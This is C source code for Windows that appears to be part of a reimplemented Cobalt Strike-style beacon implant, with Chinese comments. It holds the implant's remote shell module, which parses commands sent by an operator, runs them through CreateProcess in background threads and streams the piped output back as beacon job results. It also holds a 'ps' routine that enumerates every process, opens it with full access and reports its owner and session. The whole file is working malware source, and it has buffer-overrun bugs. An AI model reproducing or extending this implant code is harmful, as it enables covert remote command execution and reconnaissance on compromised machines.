#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include "Command.h"
#include "Job.h"
#pragma warning(disable:4996)
#ifdef UNICODE
#include <Windows.h>
#include <TlHelp32.h>
#define TCHAR wchar_t
#define TEXT(str) L##str
#else
#define TCHAR char
#define TEXT(str) str
#endif

extern BeaconJob;

// Function to convert unsigned char* to _TCHAR*
TCHAR* ConvertTo_TCHAR(const unsigned char* input) {
#ifdef UNICODE
    // If you are using Unicode
    int length = MultiByteToWideChar(CP_UTF8, 0, (const char*)input, -1, NULL, 0);
    TCHAR* result = (TCHAR*)malloc(length * sizeof(TCHAR));
    MultiByteToWideChar(CP_UTF8, 0, (const char*)input, -1, result, length);
    return result;
#else
    // If you are using ANSI
    int length = strlen((const char*)input);
    TCHAR* result = (TCHAR*)malloc((length + 1) * sizeof(TCHAR)); // +1 for the null terminator
    strcpy(result, (const char*)input);
    return result;
#endif
}

typedef struct {
    unsigned char* shellPath;
    unsigned char* shellBuf;
} ParseCommandShellparse;


struct ThreadArgs {
    unsigned char* buf;
    size_t* commandBuflen;
    size_t* Bufflen;
};
ParseCommandShellparse ParseCommandShell(unsigned char* buf) {
    uint8_t pathLenBytes[4];
    memcpy(pathLenBytes, buf, 4);
    uint32_t pathLen = bigEndianUint32(pathLenBytes);
    unsigned char* path = (unsigned char*)malloc(pathLen);
    path[pathLen] = '\0';
    unsigned char* pathstart = buf + 4;
    memcpy(path, pathstart, pathLen);
    uint8_t cmdLenBytes[4];
    unsigned char* cmdLenBytesstart = buf + 4+ pathLen;
    memcpy(cmdLenBytes, cmdLenBytesstart, 4);
    uint32_t cmdLen = bigEndianUint32(cmdLenBytes);
    unsigned char* cmd = (unsigned char*)malloc(cmdLen);
    cmd[cmdLen] = '\0';
    unsigned char* cmdstart = buf + 8 + pathLen;
    memcpy(cmd, cmdstart, cmdLen);
    unsigned char* envKey = str_replace_all(path, "%", "");

    unsigned char* app = getenv(envKey);
    ParseCommandShellparse ParseCommandShellparse;
    ParseCommandShellparse.shellPath = app;
    ParseCommandShellparse.shellBuf = cmd;
    return ParseCommandShellparse;


}
DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* buf = args->buf;
    size_t* commandBuflen = args->commandBuflen;
    size_t* Bufflen = args->Bufflen;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreatePipeJob Createpipe = createjob();
    hReadPipe = Createpipe.hReadPipe;
    si = Createpipe.si;


    ParseCommandShellparse ParseCommand = ParseCommandShell(buf);
    TCHAR* shellBuf = ConvertTo_TCHAR(ParseCommand.shellBuf);



    // 构建命令行参数
    _TCHAR commandLine[MAX_PATH];
    _sntprintf(commandLine, MAX_PATH, _T("%s"), shellBuf);//C:\WINDOWS\system32\cmd.exe  /C whoami

    bRet = CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (FALSE == bRet) {
        printf("CreateProcess");
        return FALSE;
    }
    
    Add_Beacon_0Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, "process")->JobType = 30;
    // Wait for the command execution to finish
    //WaitForSingleObject(pi.hThread, INFINITE);
    //WaitForSingleObject(pi.hProcess, INFINITE);
    WaitForSingleObject(pi.hProcess, 5000);
    // Read the result from the anonymous pipe into the output buffer
    bool lastTime = false;
    bool firstTime = true;
    OVERLAPPED overlap = { 0 };
    DWORD readbytes = 0;
    DWORD availbytes = 0;
    unsigned char buffff[1024 * 50];
    while (!lastTime) {


        DWORD event = WaitForSingleObject(pi.hProcess, 0);
        if (event == WAIT_OBJECT_0 || event == WAIT_FAILED) {
            lastTime = TRUE;
        }

        if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL)) break;
        while (lastTime == false && availbytes == 0) {
            DWORD event = WaitForSingleObject(pi.hProcess, 5000);
            PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL);
        }

        //if (!availbytes) break;
        //if (!ReadFile(hReadPipe, buffff, min(sizeof(buffff) - 1, availbytes), &readbytes, NULL) || !readbytes) break;
        if (lastTime == false || availbytes != 0) {
            ReadFile(hReadPipe, buffff, sizeof(buffff), NULL, &overlap);
        }

        DWORD bytesTransferred;
        ULONG_PTR completionKey;
        LPOVERLAPPED pOverlapped;

        if (overlap.InternalHigh > 0) {
            if (firstTime) {
                DataProcess(buffff, overlap.InternalHigh, 0);
                firstTime = false;
            }
            else {
                if (lastTime == false) {
                    /*    uint8_t requestIDBytes[5] = "[+] ";
                      uint8_t nnnn[4] = " :\n";*/

                    uint8_t* metaInfoBytes1[] = { buffff };
                    size_t metaInfosizes1[] = { overlap.InternalHigh };
                    size_t metaInfoBytesArrays1 = sizeof(metaInfoBytes1) / sizeof(metaInfoBytes1[0]);
                    uint8_t* metaInfoconcatenated1 = ConByte(metaInfoBytes1, metaInfosizes1, metaInfoBytesArrays1);
                    size_t metaInfoSize1 = 0;
                    // 计算所有 sizeof 返回值的总和
                    for (size_t i = 0; i < sizeof(metaInfosizes1) / sizeof(metaInfosizes1[0]); ++i) {
                        metaInfoSize1 += metaInfosizes1[i];
                    }

                    DataProcess(metaInfoconcatenated1, metaInfoSize1, 0);
                }
                else {
                    uint8_t jia[5] = "[+] ";
                    uint8_t nnn[2] = "\n";
                    uint8_t end[75] = "-----------------------------------end-----------------------------------\n";
                    uint8_t* metaInfoBytes[] = { jia,end,ParseCommand.shellBuf + 4 };
                    size_t metaInfosizes[] = { 5,75,strlen(ParseCommand.shellBuf) - 4 };
                    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
                    uint8_t* metaInfoconcatenated = ConByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
                    size_t metaInfoSize = 0;
                    // 计算所有 sizeof 返回值的总和
                    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
                        metaInfoSize += metaInfosizes[i];
                    }
                    DataProcess(metaInfoconcatenated, metaInfoSize, 0);


                }
                // buf[readbytes] = 0;
                 //strncat(outbuf, buf, outbuf_size - strlen(outbuf) - 1);
            }
        }

        Sleep(2000);

    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);

}
DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* buf = args->buf;
    size_t* commandBuflen = args->commandBuflen;
    size_t* Bufflen = args->Bufflen;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreatePipeJob Createpipe = createjob();
    hReadPipe = Createpipe.hReadPipe;
    si = Createpipe.si;


    ParseCommandShellparse ParseCommand = ParseCommandShell(buf);
    TCHAR* shellPath = ConvertTo_TCHAR(ParseCommand.shellPath);
    TCHAR* shellBuf = ConvertTo_TCHAR(ParseCommand.shellBuf);



    // 构建命令行参数
    _TCHAR commandLine[MAX_PATH];
    _sntprintf(commandLine, MAX_PATH, _T("%s %s"), shellPath, shellBuf);//C:\WINDOWS\system32\cmd.exe  /C whoami

    bRet = CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (FALSE == bRet) {
        printf("CreateProcess");
        return FALSE;
    }
    Add_Beacon_0Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, "process")->JobType = 30;
    // Wait for the command execution to finish
    //WaitForSingleObject(pi.hThread, INFINITE);
    //WaitForSingleObject(pi.hProcess, INFINITE);
    WaitForSingleObject(pi.hProcess, 5000);
    // Read the result from the anonymous pipe into the output buffer
    bool lastTime = false;
    bool firstTime = true;
    OVERLAPPED overlap = { 0 };
    DWORD readbytes = 0;
    DWORD availbytes = 0;
    unsigned char buffff[1024 * 50];
    while (!lastTime) {
        
        
        DWORD event = WaitForSingleObject(pi.hProcess, 0);
        if (event == WAIT_OBJECT_0 || event == WAIT_FAILED) {
            lastTime = TRUE;
        }

        if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL)) break;
        while (lastTime == false && availbytes == 0) {
            DWORD event = WaitForSingleObject(pi.hProcess, 5000);
            PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL);
        }
       
        //if (!availbytes) break;
        //if (!ReadFile(hReadPipe, buffff, min(sizeof(buffff) - 1, availbytes), &readbytes, NULL) || !readbytes) break;
        if (lastTime == false || availbytes != 0) {
            ReadFile(hReadPipe, buffff, sizeof(buffff), NULL, &overlap);
        }
        
        DWORD bytesTransferred;
        ULONG_PTR completionKey;
        LPOVERLAPPED pOverlapped;
        
        if (overlap.InternalHigh > 0) {
            if (firstTime) {
                DataProcess(buffff, overlap.InternalHigh, 0);
                firstTime = false;
            }
            else {
                if (lastTime == false) {
                    /*    uint8_t requestIDBytes[5] = "[+] ";
                      uint8_t nnnn[4] = " :\n";*/
                    
                    uint8_t* metaInfoBytes1[] = { buffff };
                    size_t metaInfosizes1[] = { overlap.InternalHigh };
                    size_t metaInfoBytesArrays1 = sizeof(metaInfoBytes1) / sizeof(metaInfoBytes1[0]);
                    uint8_t* metaInfoconcatenated1 = ConByte(metaInfoBytes1, metaInfosizes1, metaInfoBytesArrays1);
                    size_t metaInfoSize1 = 0;
                    // 计算所有 sizeof 返回值的总和
                    for (size_t i = 0; i < sizeof(metaInfosizes1) / sizeof(metaInfosizes1[0]); ++i) {
                        metaInfoSize1 += metaInfosizes1[i];
                    }

                    DataProcess(metaInfoconcatenated1, metaInfoSize1, 0);
                }else {
                    uint8_t jia[5] = "[+] ";
                    uint8_t nnn[2] = "\n";
                    uint8_t end[75] = "-----------------------------------end-----------------------------------\n";
                    uint8_t* metaInfoBytes[] = { jia,end,ParseCommand.shellBuf+4 };
                    size_t metaInfosizes[] = { 5,75,strlen(ParseCommand.shellBuf)-4};
                    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
                    uint8_t* metaInfoconcatenated = ConByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
                    size_t metaInfoSize = 0;
                    // 计算所有 sizeof 返回值的总和
                    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
                        metaInfoSize += metaInfosizes[i];
                    }
                    DataProcess(metaInfoconcatenated, metaInfoSize, 0);


                 }
                // buf[readbytes] = 0;
                 //strncat(outbuf, buf, outbuf_size - strlen(outbuf) - 1);
            }
        }
        
        Sleep(2000);

    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);

}
unsigned char* Cmdshell(unsigned char* buf, size_t* commandBuflen, size_t* Bufflen)
{
    struct ThreadArgs* args = (struct ThreadArgs*)malloc(sizeof(struct ThreadArgs));
    if (args == NULL) {
        // 处理内存分配失败的情况
        return NULL;
    }

    args->buf = buf;
    args->commandBuflen = commandBuflen;
    ParseCommandShellparse ParseCommand = ParseCommandShell(buf);
    HANDLE myThread;
    if (ParseCommand.shellPath == NULL) {
        myThread = CreateThread(
            NULL,                       // 默认线程安全性
            0,                          // 默认堆栈大小
            myThreadCmdRun,           // 线程函数
            args,                       // 传递给线程函数的参数
            0,                          // 默认创建标志
            NULL);                      // 不存储线程ID
        if (myThread == NULL) {
            fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
            return 1;
        }
    }
    else {
        myThread = CreateThread(
            NULL,                       // 默认线程安全性
            0,                          // 默认堆栈大小
            myThreadCmdshell,           // 线程函数
            args,                       // 传递给线程函数的参数
            0,                          // 默认创建标志
            NULL);                      // 不存储线程ID
        if (myThread == NULL) {
            fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
            return 1;
        }
    }
   
   
    //WaitForSingleObject(myThread, INFINITE);

    // 关闭线程和事件句柄
    CloseHandle(myThread);


    unsigned char* result = "[+] command is executing";
    unsigned char* Success = (unsigned char*)malloc(25);
    memcpy(Success, result, 25);
    *Bufflen = strlen(Success);
    return Success;

   
}
int get_user_sid(size_t BufferSize, HANDLE TokenHandle, char* Buffer)
{
    char Name[512];
    char ReferencedDomainName[512];
    DWORD cchReferencedDomainName = 512;

    SID_NAME_USE peUse;
    memset(Buffer, 0, BufferSize);
    memset(Name, 0, sizeof(Name));
    memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));

    DWORD ReturnLength;
    TOKEN_USER* TokenInformation;
    DWORD cchName = 512;

    // 获取所需的 TokenInformation 大小
    if (!GetTokenInformation(TokenHandle, TokenUser, NULL, 0, &ReturnLength) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        return 0;

    // 分配内存以容纳 TokenInformation
    TokenInformation = (TOKEN_USER*)malloc(ReturnLength);
    if (TokenInformation == NULL)
        return 0;

    // 获取 TokenInformation
    if (!GetTokenInformation(TokenHandle, TokenUser, TokenInformation, ReturnLength, &ReturnLength))
    {
        free(TokenInformation);
        return 0;
    }

    if (!LookupAccountSidA(
        NULL,
        TokenInformation->User.Sid,
        Name,
        &cchName,
        ReferencedDomainName,
        &cchReferencedDomainName,
        &peUse))
    {
        free(TokenInformation);
        return 0;
    }

    snprintf(Buffer, BufferSize, "%s\\%s", ReferencedDomainName, Name);
    Buffer[BufferSize - 1] = 0;

    free(TokenInformation);
    return 1;
}
BOOL GetProcessUserInfo(HANDLE ProcessHandle, char* usersid)
{

    HANDLE TokenHandle;
    BOOL status = OpenProcessToken(ProcessHandle, 8u, &TokenHandle);
    if (status)
    {
        status = get_user_sid(0x800, TokenHandle, usersid);
        CloseHandle(TokenHandle);
        return status;
    }
    return status;
}
BOOL IsProcessX64s(DWORD pid) {
    BOOL isX64 = FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess != NULL) {
        BOOL result = IsWow64Process(hProcess, &isX64);
        CloseHandle(hProcess);
        return result && isX64;
    }
    return FALSE;
}
void beacon_ps(char* Taskdata, int Task_size)
{

    char usersid[2048];
    memset(usersid, 0, sizeof(usersid));

    datap datap;
    BeaconDataParse(&datap, Taskdata, Task_size);
    int unknown = BeaconDataInt(&datap);
    BeaconFormatAlloc((formatp*)&datap, 0x8000);
    if (unknown > 0)
    {
        BeaconFormatInt((formatp*)&datap, unknown);
    }
 
    DWORD pSessionId;
    DWORD th32ProcessID;
    PROCESSENTRY32 pe;
    HANDLE hprocess;
    HANDLE Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
    if (Toolhelp32Snapshot != (HANDLE)-1)
    {
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(Toolhelp32Snapshot, &pe))
        {
            do
            {
                th32ProcessID = pe.th32ProcessID;
                const char* arch2 = "x64";
                BOOL isX64 = IsProcessX64s(pe.th32ProcessID);
                arch2 = !isX64 ? "x64" : "x86";
                hprocess = OpenProcess( PROCESS_ALL_ACCESS, 0, th32ProcessID);
                wchar_t* szExeFile = pe.szExeFile;
                int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, NULL, 0, NULL, NULL);
                // 分配足够的内存来存储转换后的字符串
                char* szExeFileConverted = (char*)malloc(bufferSize);
                // 将 wchar_t* 类型字符串转换成 char* 类型字符串
                WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, szExeFileConverted, bufferSize, NULL, NULL);
                if (hprocess)
                {
                    if (!GetProcessUserInfo(hprocess, usersid))
                    {
                        usersid[0] = 0;
                    }
                    if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
                    {
                        pSessionId = -1;
                    }

                    BeaconFormatPrintf(
                        (formatp*)&datap,
                        (char*)"%s\t%d\t%d\t%s\t%s\t%d\n",
                        szExeFileConverted,
                        pe.th32ParentProcessID,
                        pe.th32ProcessID,
                        arch2,
                        usersid,
                        pSessionId);
                }
                else
                {
                    if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
                    {
                        pSessionId = 0;
                    }
                    BeaconFormatPrintf((formatp*)&datap, (char*)"%s\t%d\t%d\t%s\t%s\t%d\n", 
                        szExeFileConverted,
                        pe.th32ParentProcessID,
                        pe.th32ProcessID,
                        arch2,
                        "",
                        pSessionId);
                }
                CloseHandle(hprocess);
            } while (Process32Next(Toolhelp32Snapshot, &pe));
            CloseHandle(Toolhelp32Snapshot);
            int msg_type;
            if (unknown)
            {
                msg_type = 22;
            }
            else
            {
                msg_type = 17;
            }
            int datalength = BeaconFormatlength((formatp*)&datap);
            char* databuffer = BeaconFormatOriginalPtr((formatp*)&datap);
            DataProcess(databuffer, datalength, msg_type);
            BeaconFormatFree((formatp*)&datap);
        }
        else
        {
            CloseHandle(Toolhelp32Snapshot);
        }
    }
}